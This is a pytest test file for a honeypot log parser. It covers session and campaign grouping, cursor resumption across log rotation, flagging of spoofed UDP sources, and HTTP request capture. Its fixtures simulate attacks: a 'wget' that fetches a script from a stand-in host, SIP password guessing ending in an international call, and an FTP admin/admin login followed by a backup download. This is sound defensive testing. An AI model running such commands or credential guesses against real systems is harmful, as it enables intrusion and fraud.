import pytest
import datetime
import os

from agent_fakes import T0, ssh_session, trap_event, write_log

from agents.sessions import Cursor, parse_log, pending

LATER = T0 + datetime.timedelta(days=1)


def _log(tmp_path):
    recs = ssh_session("session-a", "203.0.113.7", ["uname -a", "wget http://198.51.100.9/x.sh"])
    recs += ssh_session("session-open", "203.0.113.8", ["id"], start=1, closed=False)
    # Login-only SSH connection: no commands -> campaign, not a session.
    recs += [r for r in ssh_session("session-login", "203.0.113.9", [], start=2)]
    # SIP brute force + a fake registration and an INVITE.
    for i in range(5):
        recs.append(trap_event("sip", "auth_attempt", "192.0.2.50", f"sip-{i}", minutes=3 + i,
                               username="100", password=f"pw{i}", success=(i == 4),
                               client="friendly-scanner"))
    recs.append(trap_event("sip", "invite", "192.0.2.50", "sip-9", minutes=9,
                           data={"dialed": "011972599123456", "registered": True}))
    # FTP success followed by commands on the same connection.
    recs.append(trap_event("ftp", "auth_attempt", "192.0.2.60", "ftp-1", minutes=4,
                           username="admin", password="admin", success=True))
    recs.append(trap_event("ftp", "command", "192.0.2.60", "ftp-1", minutes=4.5,
                           data={"input": "RETR backup.tar.gz"}))
    return write_log(tmp_path / "log.jsonl", recs, extra_lines=[
        "{not json", "", "\x00\x01garbage", '{"timestamp": "bad", "task_name": "x"}', "[1,2,3]"])


def test_parse_sessions_campaigns_and_malformed_lines(tmp_path):
    parsed = parse_log(_log(tmp_path))
    assert parsed.malformed == 4  # bad json, binary garbage, bad timestamp, non-object
    s = parsed.sessions["session-a"]
    assert s.src_ip == "203.0.113.7"
    assert s.username == "root"
    assert s.commands == ["uname -a", "wget http://198.51.100.9/x.sh"]
    assert s.responses[0].startswith("output of uname")
    assert s.closed and len(s.auth_attempts) == 1
    assert "session-login" not in parsed.sessions

    sip = [c for c in parsed.campaigns.values() if c.protocol == "sip"][0]
    assert sip.attempts == 5 and sip.successes == 1
    assert len(sip.passwords) == 5 and sip.sip_extensions["100"] == 5
    assert sip.dialed["011972599123456"] == 1
    assert sip.post_login == ["INVITE 011972599123456"]
    assert sip.clients["friendly-scanner"] == 5

    ftp = [c for c in parsed.campaigns.values() if c.protocol == "ftp"][0]
    assert ftp.post_login == ["RETR backup.tar.gz"]

    ssh_camp = [c for c in parsed.campaigns.values() if c.protocol == "ssh"][0]
    assert ssh_camp.attempts == 1 and "session-login" in ssh_camp.connections


def test_cursor_only_returns_ended_unprocessed(tmp_path):
    parsed = parse_log(_log(tmp_path))
    cursor = Cursor(tmp_path / "cursor.json")
    # Shortly after the activity: the open session is not idle long enough, windows not over.
    soon = T0 + datetime.timedelta(minutes=20)
    sessions, campaigns = pending(parsed, cursor, now=soon)
    assert [s.session_id for s in sessions] == ["session-a"]
    assert campaigns == []

    sessions, campaigns = pending(parsed, cursor, now=LATER)
    assert {s.session_id for s in sessions} == {"session-a", "session-open"}
    assert {c.protocol for c in campaigns} == {"sip", "ftp", "ssh"}
    for s in sessions:
        cursor.mark(s.session_id, s.last_offset)
    for c in campaigns:
        cursor.mark(c.campaign_id, c.last_offset)
    cursor.save()

    again = Cursor(tmp_path / "cursor.json")
    assert pending(parsed, again, now=LATER) == ([], [])


# ---- high-water cursor ---------------------------------------------------------------------

def _append(path, records, partial: str = ""):
    import json

    with open(path, "a", encoding="utf-8") as f:
        for r in records:
            f.write(json.dumps(r) + "\n")
        f.write(partial)


def _done_everything(parsed, cursor, log, before=None):
    before = before or Cursor.sample(log)       # a reader samples the log before it reads
    sessions, campaigns = pending(parsed, cursor, now=LATER)
    for s in sessions:
        cursor.mark(s.session_id, s.last_offset)
    for c in campaigns:
        cursor.mark(c.campaign_id, c.last_offset)
    cursor.advance(parsed, log, before)
    return sessions, campaigns


def test_high_water_mark_reads_only_new_bytes(tmp_path):
    log = tmp_path / "log.jsonl"
    _append(log, ssh_session("session-a", "203.0.113.7", ["id"]))
    cursor = Cursor(tmp_path / "cursor.json")
    parsed = parse_log(log, start_offset=cursor.start_offset(log))
    _done_everything(parsed, cursor, log)
    cursor.save()
    size = log.stat().st_size
    assert cursor.offset == size and cursor.done == {}   # nothing in flight: done set empty

    _append(log, ssh_session("session-b", "203.0.113.8", ["uname -a"], start=5))
    again = Cursor(tmp_path / "cursor.json")
    start = again.start_offset(log)
    assert start == size
    parsed = parse_log(log, start_offset=start)
    assert set(parsed.sessions) == {"session-b"}         # session-a never re-read


def test_unfinished_items_hold_the_mark_and_partial_lines_wait(tmp_path):
    import json

    log = tmp_path / "log.jsonl"
    _append(log, ssh_session("session-done", "203.0.113.7", ["id"]))
    open_recs = ssh_session("session-open", "203.0.113.8", ["ls"], start=1, closed=False)
    _append(log, open_recs, partial=json.dumps(open_recs[0])[:40])   # writer mid-line
    cursor = Cursor(tmp_path / "cursor.json")
    parsed = parse_log(log)
    assert parsed.end_offset < log.stat().st_size                   # partial line not consumed
    sessions, _ = pending(parsed, cursor, now=T0 + datetime.timedelta(minutes=30))
    assert [s.session_id for s in sessions] == ["session-done"]
    cursor.mark("session-done", parsed.sessions["session-done"].last_offset)
    cursor.advance(parsed, log, Cursor.sample(log))
    assert cursor.offset == parsed.sessions["session-open"].first_offset
    assert "session-done" not in cursor.done or cursor.done["session-done"] >= cursor.offset


def test_rotation_or_truncation_restarts_from_zero(tmp_path):
    log = tmp_path / "log.jsonl"
    _append(log, ssh_session("session-a", "203.0.113.7", ["id"]))
    cursor = Cursor(tmp_path / "cursor.json")
    _done_everything(parse_log(log), cursor, log)
    assert cursor.start_offset(log) > 0
    log.unlink()                                                    # rotated: new inode
    _append(log, ssh_session("session-z", "203.0.113.9", ["w"]))
    assert cursor.start_offset(log) == 0
    log.write_text("")                                              # truncated
    assert cursor.start_offset(log) == 0


def test_rotated_log_reusing_the_inode_restarts_from_zero(tmp_path):
    log = tmp_path / "log.jsonl"
    _append(log, ssh_session("session-a", "203.0.113.7", ["id"]))
    cursor = Cursor(tmp_path / "cursor.json")
    _done_everything(parse_log(log), cursor, log)
    assert cursor.start_offset(log) > 0
    log.write_text("")                                              # same inode, new content
    _append(log, ssh_session("session-z", "203.0.113.9", ["w", "id", "uname -a"]))
    assert os.stat(log).st_ino == cursor.inode
    assert log.stat().st_size >= cursor.offset
    assert cursor.start_offset(log) == 0


@pytest.mark.slow
def test_large_history_does_not_cause_re_triage(tmp_path):
    log = tmp_path / "log.jsonl"
    recs = []
    for i in range(60_000):
        recs += ssh_session(f"session-{i:05d}", "203.0.113.7", ["id"], start=i / 1000)[:3]
    _append(log, recs)
    cursor = Cursor(tmp_path / "cursor.json")
    parsed = parse_log(log)
    sessions, _ = _done_everything(parsed, cursor, log)
    assert len(sessions) == 60_000
    cursor.save()
    again = Cursor(tmp_path / "cursor.json")
    parsed = parse_log(log, start_offset=again.start_offset(log))
    assert pending(parsed, again, now=LATER) == ([], []) and parsed.lines == 0


# ---- spoofable UDP sources -----------------------------------------------------------------

def test_udp_only_campaign_without_nonce_round_trip_is_unverified(tmp_path):
    recs = [trap_event("sip", "auth_attempt", "192.0.2.80", f"u{i}", minutes=i, username="100",
                       password=None, success=False, transport="udp",
                       data={"nonce_verified": False}) for i in range(5)]
    recs += [trap_event("sip", "auth_attempt", "192.0.2.81", "v1", username="100", password=None,
                        success=False, transport="udp", data={"nonce_verified": True})]
    recs += [trap_event("sip", "options", "192.0.2.82", "t1", transport="tcp")]
    parsed = parse_log(write_log(tmp_path / "log.jsonl", recs))
    by_ip = {c.src_ip: c for c in parsed.campaigns.values()}
    assert by_ip["192.0.2.80"].unverified_source
    assert not by_ip["192.0.2.81"].unverified_source
    assert not by_ip["192.0.2.82"].unverified_source


def test_cursor_saves_a_content_fingerprint_and_resumes_only_while_it_matches(tmp_path):
    log = tmp_path / "log.jsonl"
    _append(log, ssh_session("session-a", "203.0.113.7", ["id"]))
    cursor = Cursor(tmp_path / "cursor.json")
    _done_everything(parse_log(log), cursor, log, before=Cursor.sample(log))
    cursor.save()
    saved = Cursor(tmp_path / "cursor.json")
    assert saved.tail and saved.start_offset(log) == saved.offset > 0
    data = log.read_bytes()
    log.write_bytes(data[:-3] + b"XY\n")                  # same size, same inode, same first line
    assert log.stat().st_size == len(data) and os.stat(log).st_ino == saved.inode
    assert saved.start_offset(log) == 0                   # the content before the offset changed


def test_a_cursor_file_from_an_older_version_still_resumes(tmp_path):
    import json

    log = tmp_path / "log.jsonl"
    _append(log, ssh_session("session-a", "203.0.113.7", ["id"]))
    cursor = Cursor(tmp_path / "cursor.json")
    _done_everything(parse_log(log), cursor, log)
    cursor.save()
    legacy = json.loads((tmp_path / "cursor.json").read_text())
    legacy.pop("tail")                                    # as written before the fingerprint
    (tmp_path / "cursor.json").write_text(json.dumps(legacy))
    old = Cursor(tmp_path / "cursor.json")
    assert old.tail is None and old.start_offset(log) == old.offset > 0
    (tmp_path / "cursor.json").write_text(json.dumps({**legacy, "tail": 5}))
    assert Cursor(tmp_path / "cursor.json").tail is None  # a malformed field is ignored


# ---- HTTP request sequence -----------------------------------------------------------------

def _http(i, ip="198.51.100.40", task="http-1", minutes=None, client="norma/0.4", **data):
    data.setdefault("method", "GET")
    data.setdefault("path", f"/api/items/{i}")
    data.setdefault("status", 200)
    return trap_event("http", "command", ip, task, i / 60 if minutes is None else minutes,
                      client=client, data=data)


def test_http_requests_are_kept_in_order_with_their_evidence(tmp_path):
    records = [
        _http(0, path="/static/app.js", seq=1, req=1, lure_id="bundle", resp_type="text/javascript"),
        _http(1, path="/api/admin/export", query="all=1", seq=2, req=2,
              discovered_via="bundle", discovered_age=1, status=403),
        _http(2, path="/api/recover", seq=3, flow="recovery_request", flow_step="start",
              marker="build", marker_src=True, object_id_count=4, task="http-2"),
    ]
    camp = next(iter(parse_log(write_log(tmp_path / "l", records)).campaigns.values()))
    assert [r.path for r in camp.requests] == ["/static/app.js", "/api/admin/export",
                                               "/api/recover"]
    first, second, third = camp.requests
    assert (first.seq, first.req, first.lure, first.client) == (1, 1, "bundle", "norma/0.4")
    assert (second.query, second.status, second.discovered_via, second.discovered_age) == \
        ("all=1", 403, "bundle", 1)
    assert (third.flow, third.flow_step, third.marker, third.marker_src, third.object_id_count,
            third.conn) == ("recovery_request", "start", "build", True, 4, "http-2")
    assert camp.commands == ["/static/app.js", "/api/admin/export", "/api/recover"]


def test_http_request_fields_are_type_checked_and_capped(tmp_path):
    records = [_http(0, path="/" + "a" * 2000, query=["x"], status="200", seq=True, req=-1,
                     discovered_age=1.5, marker_src="yes", flow={"k": 1}, client=7),
               trap_event("http", "command", "198.51.100.40", "http-1", 0.5, data={})]
    camp = next(iter(parse_log(write_log(tmp_path / "l", records)).campaigns.values()))
    bad, empty = camp.requests
    assert len(bad.path) == 500 and bad.query == "" and bad.status is None
    assert bad.seq is None and bad.req is None and bad.discovered_age is None
    assert bad.marker_src is False and bad.flow == "" and bad.client == ""
    assert (empty.method, empty.path, empty.status) == ("", "", None)


def test_http_requests_are_bounded_and_other_protocols_keep_none(tmp_path):
    from agents.sessions import MAX_REQUESTS_KEPT, merge_campaign

    records = [_http(i, minutes=i / 1000) for i in range(MAX_REQUESTS_KEPT + 20)]
    records.append(trap_event("ftp", "command", "198.51.100.41", "ftp-1", 1,
                              data={"command": "LIST"}))
    camps = parse_log(write_log(tmp_path / "l", records)).campaigns.values()
    http = next(c for c in camps if c.protocol == "http")
    ftp = next(c for c in camps if c.protocol == "ftp")
    assert len(http.requests) == MAX_REQUESTS_KEPT and ftp.requests == []
    merge_campaign(ftp, http)
    assert len(ftp.requests) == MAX_REQUESTS_KEPT
    merge_campaign(ftp, http)
    assert len(ftp.requests) == MAX_REQUESTS_KEPT
